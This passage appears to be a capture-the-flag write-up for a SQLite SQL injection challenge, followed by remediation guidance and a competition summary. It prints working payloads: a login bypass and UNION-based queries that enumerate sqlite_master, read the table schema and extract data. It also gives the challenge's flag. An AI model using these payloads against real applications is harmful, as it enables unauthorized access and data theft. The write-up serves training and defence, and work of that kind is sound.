### 4.3Table Structure Analysis
**Target**: General table structure examination  
**Payload**:
```sql
' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE type='table' AND name='general' --
```
Table Structure:
```sql
CREATE TABLE general (flag TEXT)
```

### 4.4 Flag Extraction
**Target**: Direct flag retrieval from general table
**Payload**:
```sql
' UNION SELECT 1,2,flag,4,5 FROM general --
```
Result: Successful extraction of the flag

## 5. Technical Analysis
### 5.1 SQL Injection Patterns
```sql
-- Authentication Bypass
' OR '1'='1' --


-- Table Enumeration  
' UNION SELECT 1,2,name,4,5 FROM sqlite_master WHERE type='table' --


-- Schema Extraction
' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE type='table' AND name='general' --


-- Data Extraction
' UNION SELECT 1,2,flag,4,5 FROM general --

```
### 5.2 SQLite-Specific Techniques
- **sqlite_master Table**: System table containing database metadata
- **Union Query Construction**: Matching column counts for successful execution  
- **Error-based Discovery**: Using error messages for schema analysis

### 5.3 Attack Chain Reconstruction
- **Initial Compromise** → Login injection → Admin access
- **Database Recon** → Table enumeration → General table discovery
- **Schema Analysis** → Structure examination → Flag column identification
- **Final Extraction** → Data retrieval → Flag acquisition

## 6. Security Recommendations

### 6.1 Immediate Remediation
- **Parameterized Queries**:
- ```python
  # Vulnerable
  cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")
  
  
  # Secure
  cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
  ```
  # SQL Injection Prevention Guide

## Input Validation
- Implement strict input type checking
- Use allow-list validation for expected input patterns  
- Apply character escaping for special SQL characters

## Defense in Depth

### Database Hardening
- Apply principle of least privilege to database users
- Implement query whitelisting where possible
- Use database firewalls to monitor and block suspicious queries

### Application Security
- Deploy Web Application Firewall (WAF) with SQL injection rules
- Implement comprehensive error handling without information leakage
- Conduct regular security testing and code reviews

## Monitoring and Detection

### Audit Logging
- Monitor for unusual SQL query patterns
- Implement real-time alerting for injection attempts
- Conduct regular security log analysis

## Conclusion

This challenge demonstrated a complete SQL injection attack chain against a vulnerable SQLite database application. The systematic exploitation highlighted critical security failures in input validation, query parameterization, and database access controls.

**Flag:** `deadface{sql1t3_1nj3ct10n_ftw}`

### Key Security Lessons
- SQL injection remains a critical web application vulnerability
- SQLite databases require the same security considerations as other DBMS
- Union-based injection provides powerful data extraction capabilities
- System tables like `sqlite_master` can expose complete database structure
- Comprehensive input validation and parameterized queries are essential defenses

The successful exploitation underscores the importance of secure coding practices and defense-in-depth security measures for database-driven applications.
---

# Overall Competition Summary
**Total Challenges Solved**: 31 flags across 9 categories  

Hope the write up is useful :)
